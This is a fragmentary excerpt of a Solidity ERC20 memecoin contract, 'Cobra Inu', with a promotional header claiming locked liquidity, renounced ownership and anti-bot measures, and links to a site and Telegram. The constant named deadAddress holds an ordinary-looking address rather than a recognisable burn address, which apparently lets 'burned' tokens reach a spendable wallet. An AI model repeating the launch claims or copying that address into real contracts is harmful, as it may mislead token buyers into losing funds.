...
/*
        ...
        ANTI-BOT IN PLACE
        Liquidity will be locked for 3 Months a few minutes after launch and ownership will be renounced. 
        100% Fair Launch - no presale, no whitelist
        Join the telegram or visit our site for roadmap and more info 


        Website 🌎 : http://www.cobrainu.net/
        Telegram   : https://t.me/CobraInuETH        
*/
...
contract CobraInu is ERC20, Ownable {
    ...
    address public constant deadAddress = address(0xf6ce771A1B910287979557Ab2bf758f15EcfC361);
    ...
    constructor() ERC20("Cobra Inu", "COB") {
    ...
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
  	    ...
  	    require(newAmount <= totalSupply() * 9 / 1000, "Swap amount cannot be higher than 0.9% total supply.");
